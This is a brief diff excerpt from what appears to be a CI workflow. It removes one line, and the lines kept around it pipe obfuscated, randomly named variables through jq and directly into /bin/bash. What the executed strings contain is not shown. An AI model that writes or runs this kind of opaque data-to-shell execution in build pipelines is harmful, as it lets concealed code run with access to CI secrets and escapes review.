@@ -45,7 +45,6 @@ jobs:
           echo $naq605 | jq -r .tuogf905 | /bin/bash
           echo $jg66360 | jq -r .jyele11 | /bin/bash
           echo $ljxs46 | jq -r .owacz73 | /bin/bash
-          printf '%s' "$i53585" | jq -r .u37836 | /bin/bash
           echo $yse60442 | jq -r .qtxvf86711 | /bin/bash
 
       - name: Upload results
